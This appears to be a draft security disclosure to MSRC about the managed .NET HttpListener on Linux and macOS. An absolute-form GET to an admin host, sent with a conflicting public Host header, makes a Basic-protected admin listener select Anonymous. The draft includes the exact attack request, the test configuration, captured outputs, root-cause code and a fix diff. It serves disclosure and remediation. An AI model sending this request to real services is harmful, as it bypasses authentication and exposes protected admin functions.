# MSRC draft — managed HttpListener absolute-form authority confusion bypasses per-request authentication

## Suggested title

Managed HttpListener absolute-form authority confusion lets an unauthenticated client reach a Basic-protected listener as Anonymous

## Summary

The managed HttpListener implementation used on Linux and macOS can expose conflicting authorities for a single
HTTP/1.1 absolute-form request.

For:

```http
GET http://admin.test:<port>/ HTTP/1.1
Host: public.test:<port>
Connection: close
```

managed HttpListener exposes:

```text
Request.Url.Host     = admin.test
Request.UserHostName = public.test:<port>
```

This split occurs before two framework-owned decisions:

1. HttpListener prefix routing uses `Request.Url` and selects the `admin.test` HttpListener.
2. That admin listener's `AuthenticationSchemeSelectorDelegate` receives the same request. If it uses the
   Microsoft-documented `UserHostName` property to select per-host authentication, it sees `public.test` and can
   select `Anonymous`.

The result is that an unauthenticated remote client is delivered an anonymous `HttpListenerContext` from the
Basic-protected admin listener.

The same ordinary request to `admin.test` selects Basic, receives `401 Unauthorized` plus
`WWW-Authenticate: Basic`, and is not delivered as a context.

Windows/http.sys canonicalizes the conflicting absolute-form request to the request-target authority before the
selector runs, so the identical control remains protected.

## Security invariant

A single accepted request must not use one authority to choose the target HttpListener and a different authority to
choose the authentication policy protecting that HttpListener.

RFC 9112 section 3.2.2 requires an origin server receiving absolute-form to ignore the received Host field and use the
authority from the request-target.

## Confirmed affected releases

Researcher-controlled end-to-end proof:

https://github.com/SamCloudJourney/basic-website/actions/runs/35528291290

Confirmed vulnerable:

- .NET 8.0.31 / Ubuntu 24.04.5
- .NET 9.0.20 / Ubuntu 24.04.5
- .NET 10.0.12 / Ubuntu 24.04.5
- .NET 10.0.12 / macOS 15.7.9

Negative control:

- .NET 10.0.12 / Windows 2025 / http.sys — 401 Basic, no admin context delivered

Validated current runtime source commit:

`12921b1d8c6865a774232de9379133020ad23d79`

## Proof configuration

Synthetic DNS names are mapped to loopback in the researcher-controlled test environment.

```csharp
publicListener.Prefixes.Add($"http://public.test:{port}/");
adminListener.Prefixes.Add($"http://admin.test:{port}/");

publicListener.AuthenticationSchemes = AuthenticationSchemes.Anonymous;

adminListener.AuthenticationSchemeSelectorDelegate = request =>
{
    string hostOnly = request.UserHostName.Split(':')[0];

    return hostOnly == "public.test"
        ? AuthenticationSchemes.Anonymous
        : AuthenticationSchemes.Basic;
};
```

This is intentionally minimal. There is no custom application router deciding whether the request is public or admin.
HttpListener's own prefix routing chooses the listener.

## Control: public authority

```http
GET / HTTP/1.1
Host: public.test:<port>
Connection: close
```

```text
HTTP/1.1 200 OK
publicContext=True
adminContext=False
basicChallenge=False
adminSentinel=False
```

## Control: protected admin authority

```http
GET / HTTP/1.1
Host: admin.test:<port>
Connection: close
```

```text
selector UserHostName=admin.test:<port>
selector Url.Host=admin.test
selected=Basic

HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic ...
publicContext=False
adminContext=False
adminSentinel=False
```

The framework does not return an unauthenticated admin context.

## Attack

```http
GET http://admin.test:<port>/ HTTP/1.1
Host: public.test:<port>
Connection: close
```

Managed .NET 10 Linux:

```text
SELECTOR listener=ADMIN
UserHostName=public.test:<port>
Url.Host=admin.test
Selected=Anonymous

ADMIN_CONTEXT
UserHostName=public.test:<port>
Url.Host=admin.test
User=ANONYMOUS

HTTP/1.1 200 OK
basicChallenge=False
publicContext=False
adminContext=True
adminSentinel=True

FRAMEWORK_PREFIX_ROUTING_AUTH_BYPASS=CONFIRMED
```

The returned sentinel represents a researcher-controlled protected admin action.

## Windows negative control

Identical test model and request:

```text
SELECTOR listener=ADMIN
UserHostName=admin.test:<port>
Url.Host=admin.test
Selected=Basic

HTTP/1.1 401 Unauthorized
basicChallenge=True
publicContext=False
adminContext=False
adminSentinel=False

FRAMEWORK_PREFIX_WINDOWS_NEGATIVE_CONTROL=PASS
```

## Root cause

In managed `HttpListenerRequest.FinishInitialization()`:

```csharp
ReadOnlySpan<char> host = UserHostName;
...
if (raw_uri != null)
    host = raw_uri.Host;
```

The local `host` variable is updated for constructing `Request.Url`, but the public property remains backed by the
received Host header:

```csharp
public string UserHostName => Headers[HttpKnownHeaderNames.Host]!;
```

Managed listener routing then uses the canonical URI:

```csharp
HttpListener? listener = SearchListener(req.Url, out prefix);
...
string host = uri.Host;
...
if (p.Host != host || p.Port != port)
    continue;
...
bestMatch = localPrefixes[p];
```

Authentication is then selected on that chosen listener:

```csharp
context.AuthenticationSchemes =
    context._listener!.SelectAuthenticationScheme(context);
```

and:

```csharp
return AuthenticationSchemeSelectorDelegate != null
    ? AuthenticationSchemeSelectorDelegate(context.Request)
    : _authenticationScheme;
```

Thus the target listener is selected from one authority while its authentication callback can observe another.

## Causal remediation experiment

A minimal research patch canonicalizes the Host-facing state when absolute-form is accepted:

```diff
 if (raw_uri != null)
-    host = raw_uri.Host;
+{
+    host = raw_uri.Host;
+    Headers.Set(HttpKnownHeaderNames.Host, raw_uri.Authority);
+}
```

The current-main regression is structured to require:

- vulnerable source: conflicting request reaches the admin path anonymously;
- patched source: same bytes select Basic, return 401 + Basic challenge, and no context is delivered;
- public origin-form control remains Anonymous / 200;
- ordinary admin origin-form control remains Basic / 401.

## Microsoft documentation

AuthenticationSchemeSelectorDelegate:
https://learn.microsoft.com/dotnet/api/system.net.httplistener.authenticationschemeselectordelegate

AuthenticationSchemes:
https://learn.microsoft.com/dotnet/api/system.net.httplistener.authenticationschemes

Microsoft documents the selector for choosing different authentication mechanisms from request characteristics, and
the AuthenticationSchemes documentation specifically includes `Url` and `UserHostName` as examples.

## RFC reference

RFC 9112 section 3.2.2:
https://www.rfc-editor.org/rfc/rfc9112.html#section-3.2.2

The RFC requires an origin server receiving an absolute-form request-target to ignore the received Host field and use
the request-target authority. It also requires servers to accept absolute-form.

## Security impact

Demonstrated consequence: authentication/security-feature bypass.

An unauthenticated network client can cause the managed HttpListener to route a request to a listener identified by
the absolute-form target authority while that listener's per-request authentication selector evaluates a conflicting
Host-derived authority and selects Anonymous.

The proof demonstrates a protected admin listener that:

- returns 401 Basic for the ordinary unauthenticated admin request;
- returns an anonymous admin context for the conflicting absolute-form request; and
- executes a synthetic protected admin action.

No claim is made that every HttpListener application is affected. Exploitation requires an application to use
`AuthenticationSchemeSelectorDelegate` with request authority characteristics in a way supported by Microsoft's
documented API model.

## Suggested classification

- Security Feature Bypass / Authentication Bypass
- Authority canonicalization / inconsistent HTTP request interpretation
- Potential CWE mapping: CWE-444 (inconsistent interpretation of HTTP requests) with authentication-bypass consequence

## Research scope

All listeners, hosts, ports, credentials, response bodies, and actions are synthetic and researcher-controlled.
Testing used repository source and local GitHub Actions runners only.
